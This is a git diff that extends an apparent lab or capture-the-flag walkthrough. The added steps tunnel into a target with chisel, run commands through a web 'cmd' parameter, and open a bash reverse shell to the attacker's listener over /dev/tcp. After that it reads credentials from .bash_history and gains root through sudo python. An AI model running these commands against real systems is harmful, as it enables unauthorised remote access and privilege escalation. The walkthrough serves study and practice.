@@ -215,17 +215,88 @@ nmap -p9999 --open -T5 -v 192.168.1.176
 ![image](https://github.com/user-attachments/assets/7e132b47-e3b1-42d2-97c9-79f2fd553ba3)
 
 #### **By using a tool we are going to make our PORT 9999 in the PORT 9999 of the victim machine to gain access and discover more things.**
-[chisel](https://github.com/jpillora/chisel)
+[chisel](https://github.com/jpillora/chisel)<br>
 ![image](https://github.com/user-attachments/assets/bafec1d9-00fc-42ae-9724-d284fc1d8105)
 ![image](https://github.com/user-attachments/assets/a323543d-e20b-418f-b005-1b320f786f37)
 ![image](https://github.com/user-attachments/assets/06d525ce-42a8-4814-a1c5-bc8f53d3a1e3)
 
+#### **conferring privileges**
+```bash
+chmod +x chisel_1.10.1_linux_amd64.gz
+```
+![image](https://github.com/user-attachments/assets/3b33a870-9178-4a9b-bffd-3ab48d397655)
 
+#### **uploading our tool to the victim machine**
+```bash
+python3 -m http.server 80
+```
+![image](https://github.com/user-attachments/assets/5744d150-2c4d-4026-aae8-c71e1790187a)
 
+```bash
+wget http://192.168.1.228/chisel_1.10.1_linux_amd64
+```
+![image](https://github.com/user-attachments/assets/3fbaf60d-e9cf-442d-9700-4db382217471)
 
+#### **conferring privileges**
+```bash
+chmod +x chisel_1.10.1_linux_amd64.gz
+```
+![image](https://github.com/user-attachments/assets/48617ba3-0b41-4b92-b34a-6c787ff9b0a9)
 
+### **making a connection**
+#### **attacking machine**
+```bash
+./chisel_1.10.1_linux_amd64 server --reverse -p 1234
+```
+#### **victim machine**
+```bash
+./chisel_1.10.1_linux_amd64 client 192.168.1.228:1234 R:9999:127.0.0.1:9999
+```
+![image](https://github.com/user-attachments/assets/c952326c-209a-4167-8092-04da1fe1a9c9)
 
+```bash
+lsof -i:9999
+```
+![image](https://github.com/user-attachments/assets/70e65d32-ccf4-4983-b752-beabffede00b)
+![image](https://github.com/user-attachments/assets/b5f1dba1-395c-4c46-a64d-76da9d88cfdc)
+```bash
+http://localhost:9999/?cmd=whoami
+```
+![image](https://github.com/user-attachments/assets/b77837f9-8b12-4f6d-aa5f-a0e217590c75)
 
+#### **We send that connection to another port to intercept it.**
+```bash
+nc -nlvp 444
+```
+![image](https://github.com/user-attachments/assets/e56466ff-004c-4c83-b01f-9c23eccb2700)
 
+```bash
+http://localhost:9999/?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.228/444 0>%261"
+```
+![image](https://github.com/user-attachments/assets/b737b17c-8a59-4937-af41-d524e0cfe778)
 
+![image](https://github.com/user-attachments/assets/7cd39ef3-6981-43be-b2d0-9a36bd80ac0a)
 
+#### **TTY treatment**
+```bash
+script /dev/null -c bash
+"CTRL+Z"
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
+![image](https://github.com/user-attachments/assets/622e23d6-c524-49e8-b138-ab0b0e9cdf83)<br>
+
+#### **Investigating the .bash_history file we found that the user lama login credentials**
+![image](https://github.com/user-attachments/assets/4a0c28c2-e4ba-490c-93b5-4892abdb57cb)
+
+```bash
+sudo -l
+```
+![image](https://github.com/user-attachments/assets/1df027a9-9c23-4cff-9386-e25396d0c751)
+![image](https://github.com/user-attachments/assets/c628441b-dc4f-4c7d-b5d3-a7e8b33fd67e)
+```bash
+sudo python3 -c 'import os; os.system("/bin/sh")'
+```
+![image](https://github.com/user-attachments/assets/54903266-4e5e-4852-9545-9075f0471cd6)
